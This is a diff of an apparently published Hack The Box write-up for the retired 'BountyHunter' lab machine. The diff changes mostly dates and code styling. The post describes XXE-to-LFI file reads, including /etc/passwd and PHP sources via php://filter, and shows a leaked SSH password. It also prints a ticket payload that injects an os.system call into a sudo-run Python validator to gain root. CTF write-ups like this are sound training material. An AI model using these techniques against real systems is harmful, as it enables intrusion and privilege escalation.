@@ -15,7 +15,7 @@
     <meta property="og:url" content="inesmartins.github.io/htb-write-up-bountyhunter/" />
     <meta property="og:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.14.19.png" />
     <meta property="article:published_time" content="2021-11-29T23:14:17.000Z" />
-    <meta property="article:modified_time" content="2021-12-31T11:16:09.000Z" />
+    <meta property="article:modified_time" content="2022-03-23T18:27:46.000Z" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="HTB Write-up | BountyHunter" />
     <meta name="twitter:description" content="Retired machine can be found here.ScanningLike with most HTB machines, a quick scan only disclosed SSH running on port 22 and a web server running on port 80: ~ nmap 10.10.11.100 PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http ~ nmap 10.10.11.100" />
@@ -50,7 +50,7 @@
     "headline": "HTB Write-up | BountyHunter",
     "url": "inesmartins.github.io/htb-write-up-bountyhunter/",
     "datePublished": "2021-11-29T23:14:17.000Z",
-    "dateModified": "2021-12-31T11:16:09.000Z",
+    "dateModified": "2022-03-23T18:27:46.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.14.19.png",
@@ -658,7 +658,7 @@
             </figure>
             <section class="post-content">
 
-                <blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code>~ nmap 10.10.11.100
+                <blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.100
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -673,14 +673,13 @@ PORT   STATE SERVICE
 |_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 |_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Bounty Hunters</code></pre><p>The website seems to be the corporate page for "The B Team": they're bounty hunters, security researchers, and can also use Burp ... impressive stuff.</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>The "Portal" link sends us to a <code>portal.php</code> page, which itself links to a page that contains "the bounty tracker" - note that the portal itself is "under development":</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>The "bounty tracker" aka the "Bounty Report System" is hosted at <code>/log_submit.php</code> and is still in beta:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>We're also able to navigate the <code>/resources</code> directory, which contains some interesting files:</p><figure class="kg-card kg-image-card"></figure><p>The most interesting, at first glance, seems to be this note:</p><figure class="kg-card kg-image-card"></figure><p>A lot to unpack here:</p><ul><li>there's a <code>test</code> account on the portal that supports <code>nopass</code>;</li><li>we should probably take a look at the "tracker submit script";</li><li>this script is not yet connected to a DB;</li><li>there's a <code>developer</code> group somewhere, that used to have too many permissions.</li></ul><p>Running <code>nikto</code> we also found a <code>db.php</code> file:</p><pre><code>~ nikto -host 10.10.11.100
+|_http-title: Bounty Hunters</code></pre><p>The website seems to be the corporate page for "The B Team": they're bounty hunters, security researchers, and can also use Burp ... impressive stuff.</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>The "Portal" link sends us to a <code>portal.php</code> page, which itself links to a page that contains "the bounty tracker" - note that the portal itself is "under development":</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>The "bounty tracker" aka the "Bounty Report System" is hosted at <code>/log_submit.php</code> and is still in beta:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>We're also able to navigate the <code>/resources</code> directory, which contains some interesting files:</p><figure class="kg-card kg-image-card"></figure><p>The most interesting, at first glance, seems to be this note:</p><figure class="kg-card kg-image-card"></figure><p>A lot to unpack here:</p><ul><li>there's a <code>test</code> account on the portal that supports <code>nopass</code>;</li><li>we should probably take a look at the "tracker submit script";</li><li>this script is not yet connected to a DB;</li><li>there's a <code>developer</code> group somewhere, that used to have too many permissions.</li></ul><p>Running <code>nikto</code> we also found a <code>db.php</code> file:</p><pre><code class="language-prettyprint lang-sh">~ nikto -host 10.10.11.100
 ...
-OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.</code></pre><p>And indeed, unlike other random (non-existing) files, this one doesn't return <code>404</code>, but also doesn't return any data.</p><hr></hr><h2 id="xxe-to-lfi">XXE to LFI</h2><p>The <code>/resources/bountylog.js</code> file seems to be the aforementioned "tracker submit script". As you can see below, this script:</p><ul><li>takes the values from the form submitted on the <code>log_submit.php</code> page</li><li>builds an <code>XML</code> string</li><li><code>base64</code>-encodes this data</li><li>sends it to <code>/tracker_diRbPr00f314.php</code> via <code>POST</code> request</li></ul><figure class="kg-card kg-image-card"></figure><p>In response, this <code>/tracker_diRbPr00f314.php</code> page displays the submitted data, and also an interesting message: "If DB were ready, would have added: [...]" - this lets us know that <strong>the DB is not yet configured</strong>:</p><figure class="kg-card kg-image-card"></figure><p>Since the data is sent via <code>XML</code> I wanted to see if I could manipulate this payload in a way that achieves <code>LFI</code> using <code>XXE</code>. As always, I created a Python script to help me test ideas out:</p><p>Turns out, the application <em>is</em> vulnerable to <code>XXE</code> - as an example we can see the output of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="lfi-to-rce">LFI to RCE</h2><p>After running this script with a few different <a href="https://github.com/danielmiessler/SecLists">SecLists</a> (and creating some lists of my own), I was able to get the exact Linux version:</p><pre><code>Linux version 5.4.0-80-generic (buildd@lcy01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021
-</code></pre><p>... as well as the most interesting users:</p><pre><code># /etc/passwd
+OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.</code></pre><p>And indeed, unlike other random (non-existing) files, this one doesn't return <code>404</code>, but also doesn't return any data.</p><hr></hr><h2 id="xxe-to-lfi">XXE to LFI</h2><p>The <code>/resources/bountylog.js</code> file seems to be the aforementioned "tracker submit script". As you can see below, this script:</p><ul><li>takes the values from the form submitted on the <code>log_submit.php</code> page</li><li>builds an <code>XML</code> string</li><li><code>base64</code>-encodes this data</li><li>sends it to <code>/tracker_diRbPr00f314.php</code> via <code>POST</code> request</li></ul><figure class="kg-card kg-image-card"></figure><p>In response, this <code>/tracker_diRbPr00f314.php</code> page displays the submitted data, and also an interesting message: "If DB were ready, would have added: [...]" - this lets us know that <strong>the DB is not yet configured</strong>:</p><figure class="kg-card kg-image-card"></figure><p>Since the data is sent via <code>XML</code> I wanted to see if I could manipulate this payload in a way that achieves <code>LFI</code> using <code>XXE</code>. As always, I created a Python script to help me test ideas out:</p><p>Turns out, the application <em>is</em> vulnerable to <code>XXE</code> - as an example we can see the output of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="lfi-to-rce">LFI to RCE</h2><p>After running this script with a few different <a href="https://github.com/danielmiessler/SecLists">SecLists</a> (and creating some lists of my own), I was able to get the exact Linux version:</p><pre><code class="language-prettyprint lang-sh">Linux version 5.4.0-80-generic (buildd@lcy01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021</code></pre><p>... as well as the most interesting users:</p><pre><code class="language-prettyprint lang-sh"># /etc/passwd
 ...
 root:x:0:0:root:/root:/bin/bash
 development:x:1000:1000:Development:/home/development:/bin/bash
-...</code></pre><p>After changing the script to use <code>php://filter/read=convert.base64-encode/resource=</code> instead of <code>file://</code> for files ending in <code>.php</code>, I also had access to all of the project's files, including the DB:</p><pre><code>~ python3 xxe-script.py -url http://10.10.11.100/tracker_diRbPr00f314.php -pathlist wordlists/custom-finding-webserver-files.txt
+...</code></pre><p>After changing the script to use <code>php://filter/read=convert.base64-encode/resource=</code> instead of <code>file://</code> for files ending in <code>.php</code>, I also had access to all of the project's files, including the DB:</p><pre><code class="language-prettyprint lang-sh">~ python3 xxe-script.py -url http://10.10.11.100/tracker_diRbPr00f314.php -pathlist wordlists/custom-finding-webserver-files.txt
 Checking /var/www/html/db.php
 	File contains data!
 Checking /var/www/html/index.php
@@ -703,8 +702,8 @@ Checking /var/www/html/resources/bootstrap_login.min.js
 Checking /var/www/html/resources/bountylog.js
 Checking /var/www/html/resources/jquery.easing.min.js
 Checking /var/www/html/resources/jquery.min.js
-Checking /var/www/html/resources/jquery_login.min.js</code></pre><figure class="kg-card kg-image-card"></figure><p>Luckily for us, someone used the same creds for the DB and <code>SSH</code> access, so I got a shell:</p><pre><code>~ ssh development@10.10.11.100
-&gt; m19RoAU0hP41A1sTsq6K</code></pre><hr></hr><h2 id="r00ting">R00ting</h2><p>Once in the user's <code>/home</code> directory, I could see a message from John to other developers:</p><pre><code>~ ls -la
+Checking /var/www/html/resources/jquery_login.min.js</code></pre><figure class="kg-card kg-image-card"></figure><p>Luckily for us, someone used the same creds for the DB and <code>SSH</code> access, so I got a shell:</p><pre><code class="language-prettyprint lang-sh">~ ssh development@10.10.11.100
+&gt; m19RoAU0hP41A1sTsq6K</code></pre><hr></hr><h2 id="r00ting">R00ting</h2><p>Once in the user's <code>/home</code> directory, I could see a message from John to other developers:</p><pre><code class="language-prettyprint lang-sh">~ ls -la
 lrwxrwxrwx 1 root        root           9 Apr  5 22:53 .bash_history -&gt; /dev/null
 -rw-r--r-- 1 development development  220 Feb 25  2020 .bash_logout
 -rw-r--r-- 1 development development 3771 Feb 25  2020 .bashrc
@@ -714,7 +713,7 @@ drwxrwxr-x 3 development development 4096 Apr  6 23:34 .local
 -rw-r--r-- 1 development development  807 Feb 25  2020 .profile
 drwx------ 2 development development 4096 Apr  7 01:48 .ssh
 -rw-r--r-- 1 root        root         471 Jun 15 16:10 contract.txt
--r--r----- 1 root        development   33 Sep 19 06:18 user.txt</code></pre><pre><code>$ cat contract.txt
+-r--r----- 1 root        development   33 Sep 19 06:18 user.txt</code></pre><pre><code class="language-prettyprint lang-sh">$ cat contract.txt
 Hey team,
 
 I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
@@ -723,14 +722,14 @@ This has been our first job since the "rm -rf" incident and we can't mess this u
 
 I set up the permissions for you to test this. Good luck.
 
--- John</code></pre><p>John seems to be referring to some "internal tool" sent by "Skytrain Inc", so I tried to find any other reference to this company. Under <code>/opt</code> I got some interesting matches:</p><pre><code>$ grep -Rils 'Skytrain' /opt
+-- John</code></pre><p>John seems to be referring to some "internal tool" sent by "Skytrain Inc", so I tried to find any other reference to this company. Under <code>/opt</code> I got some interesting matches:</p><pre><code class="language-prettyprint lang-sh">$ grep -Rils 'Skytrain' /opt
 
 /opt/skytrain_inc/ticketValidator.py
 /opt/skytrain_inc/invalid_tickets/390681613.md
 /opt/skytrain_inc/invalid_tickets/734485704.md
 /opt/skytrain_inc/invalid_tickets/529582686.md
-/opt/skytrain_inc/invalid_tickets/600939065.md</code></pre><p>The <code>ticketValidator.py</code> seems interesting:</p><pre><code>~ ls -la /opt/skytrain_inc/ticketValidator.py
--r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py</code></pre><p>When we run it using some of the tickets in the same directory, we see that these tickets are invalid:</p><pre><code>$ python3 /opt/skytrain_inc/ticketValidator.py
+/opt/skytrain_inc/invalid_tickets/600939065.md</code></pre><p>The <code>ticketValidator.py</code> seems interesting:</p><pre><code class="language-prettyprint lang-sh">~ ls -la /opt/skytrain_inc/ticketValidator.py
+-r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py</code></pre><p>When we run it using some of the tickets in the same directory, we see that these tickets are invalid:</p><pre><code class="language-prettyprint lang-sh">$ python3 /opt/skytrain_inc/ticketValidator.py
 Please enter the path to the ticket file.
 /opt/skytrain_inc/invalid_tickets/390681613.md
 Destination: New Haven
@@ -740,7 +739,7 @@ $ python3 /opt/skytrain_inc/ticketValidator.py
 Please enter the path to the ticket file.
 /opt/skytrain_inc/invalid_tickets/734485704.md
 Destination: Bridgeport
-Invalid ticket.</code></pre><p>Let's take a closer look at the script to see if we're able to abuse it:</p><pre><code class="language-python">#Skytrain Inc Ticket Validation System 0.1
+Invalid ticket.</code></pre><p>Let's take a closer look at the script to see if we're able to abuse it:</p><pre><code class="language-pythonprettyprint lang-python">#Skytrain Inc Ticket Validation System 0.1
 #Do not distribute this file.
 
 def load_file(loc):
@@ -792,13 +791,13 @@ def main():
     ticket.close
 
 main()
-</code></pre><p>After some local tests I was able to create a valid payload, but I was still unable to get the root flag, due to a "Permission denied" exception:</p><pre><code># Skytrain Inc
+</code></pre><p>After some local tests I was able to create a valid payload, but I was still unable to get the root flag, due to a "Permission denied" exception:</p><pre><code class="language-prettyprint lang-sh"># Skytrain Inc
 ## Ticket to Bridgeport
 __Ticket Code:__
 **18 + __import__('os').system('cat /root/root.txt')**
 ##Issued: 2021/06/21
-#End Ticket</code></pre><p>After using <code>linpeas.sh</code> I realised that I was able to execute a very specific command as <code>sudo</code>:</p><pre><code>User development may run the following commands on bountyhunter:
-    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre><p>Using this privileged command, I was able to get the flag:</p><pre><code>$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+#End Ticket</code></pre><p>After using <code>linpeas.sh</code> I realised that I was able to execute a very specific command as <code>sudo</code>:</p><pre><code class="language-prettyprint lang-sh">User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre><p>Using this privileged command, I was able to get the flag:</p><pre><code class="language-prettyprint lang-sh">$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 Please enter the path to the ticket file.
 /tmp/malicious.md
 Destination: Bridgeport
